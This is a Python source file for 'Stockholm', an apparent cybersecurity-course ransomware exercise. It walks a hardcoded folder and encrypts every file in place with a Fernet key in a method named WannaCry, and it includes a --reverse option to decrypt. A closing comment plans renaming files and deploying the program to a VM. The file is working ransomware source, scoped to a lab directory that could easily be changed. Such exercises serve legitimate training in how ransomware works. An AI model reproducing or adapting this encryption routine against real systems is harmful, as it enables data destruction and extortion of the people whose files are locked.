from art import *
import sys
import platform
import os
from cryptography.fernet import Fernet
import cryptography
from scanf import scanf


Stockholm_version = "0.1"
Folders_to_encrypt = "/home/tauer/Documents/Piscine-Cybersecurity/Stockholm/infection/"

class Stockholm :
    def __init__(self, argv):
        self.index = 0
        self.reverse = False
        self.silent = False
        self.reverse_key = None
        self.complete_files = []
        
        
        try :
            self.crawl_file()
            self.check_parameters(argv)
            if self.reverse is True:
                self.Reverse_encrypting()
            else:
                self.WannaCry()
        except Exception as e:
            print("\033[1;41m" + " " * 70 + "\033[0m")
            print(f"\033[1;41m{'ERROR:'.center(70)}\033[0m")
            print(f"\033[1;41m{str(e).center(70)}\033[0m")
            print("\033[1;41m" + " " * 70 + "\033[0m")
    
    def reverse_key_display(self, key):
        if self.silent == False:
            print("\033[1;42m" + " " * 50 + "\033[0m")
            print(f"\033[1;42m{'DECRYPTION KEY:'.center(50)}\033[0m")
            print(f"\033[1;42m{key.decode().center(50)}\033[0m")
            print("\033[1;42m" + " " * 50 + "\033[0m")
        
    def help(self):
        if self.silent == False:
            print("\033[1;36m" + text2art('''Need help buddy ?''', font="small") + "\033[0m")
            print("\033[1;32m--help or --h\033[0m: \033[1;34mdisplay help\033[0m")
            print("\033[1;32m--version or --v\033[0m: \033[1;34mshow version program\033[0m")
            print("\033[1;32m--reverse or --r <key to decrypt>\033[0m: \033[1;34mreverse the infection :3\033[0m")
            print("\033[1;32m--silent or --s\033[0m: \033[1;34mto silent showing file in terminal\033[0m\n\n")
        
    def version(self):
        if self.silent == False:
            system_info = platform.uname()
            print("\n\033[1;31mStockholm Version:\033[0m \033[1;37m" + Stockholm_version + "\033[0m")
            print("\033[1;31mSystem Affected:\n\t\033[0m \033[1;37m" + f"{system_info.system} {system_info.node} {system_info.release}\n\t {system_info.version} {system_info.machine}" + "\033[0m\n")
        
    def check_parameters(self, argv):
        for parameter in argv:
            if "-help" in parameter or "-h" in parameter:
                self.help()
            if "--version" in parameter or "--v" in parameter:
                self.version()
            if ("--reverse" in parameter or "--r" in parameter):
                if (argv.index(parameter) + 1 < len(argv)):
                    self.reverse = True
                    self.reverse_key = argv[argv.index(parameter) + 1]
                else :
                    raise Exception("python3 ./stockholm --r < THE KEY BABY :3 >")
            if  "--silent" in parameter or "--s" in parameter:
                self.silent = True
    
    def encrypt_file(self, file_path):
        fernet = Fernet(self.reverse_key)
        
        with open(file_path, 'rb') as file:
            original = file.read()
            
        encrypted = fernet.encrypt(original)
        
        with open(file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)
    
    def decrypt_file(self, file_path):
        if self.reverse_key == None:
            raise Exception("failed to encrypt")
        
        try:
            fernet = Fernet(self.reverse_key)
            with open(file_path, 'rb') as enc_file:
                encrypted = enc_file.read()
            decrypted = fernet.decrypt(encrypted)
            self.index+=1
        except cryptography.fernet.InvalidToken:
                raise Exception("Invalid encryption key. Decryption failed.")
        
        with open(file_path, 'wb') as dec_file:
            dec_file.write(decrypted) 
    
    def display_current_file(self, file_path, is_encrypting):
        if self.silent == False:
            folder, filename = os.path.split(file_path)
            if is_encrypting:
                print(f"\033[1;32m[{self.index}]\033[0m : \033[1;34m[{folder}]\033[0m - \033[1;33m[{filename}]\033[0m")
            else:
                print(f"\033[1;31m[{self.index}]\033[0m : \033[1;34m[{folder}]\033[0m - \033[1;33m[{filename}]\033[0m")
            
    
    def crawl_file(self):
        for root, dir_names, file_names in os.walk(Folders_to_encrypt):
            for f in file_names:
                self.complete_files.append(os.path.join(root, f))
    
    
    def WannaCry(self):
        self.reverse_key = Fernet.generate_key()
        
        if self.silent == False:
            print(f"\n\033[1;31mWorking on:\033[0m {Folders_to_encrypt}\n")
            self.reverse_key_display(self.reverse_key)
            print(f"\n\033[1;34mEncrypting:\033[0m")
            
        
        with open('filekey.key', 'wb') as filekey:
            filekey.write(self.reverse_key)
        
        for file_path in self.complete_files:
            self.display_current_file(file_path, True)
            self.encrypt_file(file_path)
            self.index+=1

        if self.silent == False:
            print(f"\n\033[1;36mNumber of files processed:\033[0m \033[1;33m{self.index}\033[0m\n")
  
         
    def Reverse_encrypting(self):
        if self.silent == False:
            print(f"\n\033[1;31mWorking on:\033[0m {Folders_to_encrypt}\n")
            print(f"\033[1;34mDecrypting:\033[0m")
        
        for file_path in self.complete_files:
            self.display_current_file(file_path, False)
            self.decrypt_file(file_path)
        
        if self.silent == False:
            print(f"\n\033[1;36mNumber of files processed:\033[0m \033[1;33m{self.index}\033[0m\n")
        
        
        
#! verifier les extensions de fichier, renommer .ft , deployer sur vm
        
        
          
        
    
Stockholm(sys.argv)
    

    
